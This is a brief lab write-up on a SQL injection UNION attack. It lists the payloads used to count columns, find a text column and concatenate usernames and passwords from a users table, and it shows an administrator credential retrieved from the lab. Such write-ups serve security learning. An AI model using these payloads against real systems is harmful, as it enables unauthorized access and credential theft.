# Lab: SQL injection UNION attack, retrieving multiple values in a single column

First need to figure out how many columns there are. This returns a successful response: `'+UNION+SELECT+NULL,NULL+FROM+users--`

Next, need to find out which columns hold text:

`'+UNION+SELECT+'a',NULL+FROM+users--` (error)

`'+UNION+SELECT+NULL,'a'+FROM+users--` (success)


Use the second column to display data:
`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`

This returns `administrator~lfq5meezzl55odzkmat2`, along with some other credentials pairs.